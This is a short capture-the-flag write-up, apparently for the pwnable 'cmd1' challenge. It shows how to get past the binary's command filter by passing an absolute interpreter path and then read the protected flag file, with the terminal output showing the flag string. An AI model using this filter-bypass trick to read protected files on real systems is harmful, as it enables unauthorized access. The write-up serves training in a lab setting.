# cmd1

```bash
./cmd1 /usr/bin/python

# Inside python interpreter
with open('/home/cmd1/flag', 'r') as f:
    print(f.read())
 
```


```
cmd1@pwnable:~$ ./cmd1 /usr/bin/python
Python 2.7.12 (default, Mar  1 2021, 11:38:31) 
[GCC 5.4.0 20160609] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> with open('/home/cmd1/flag', 'r') as f:
...     print(f.read())
... 
mommy now I get what PATH environment is for :)
```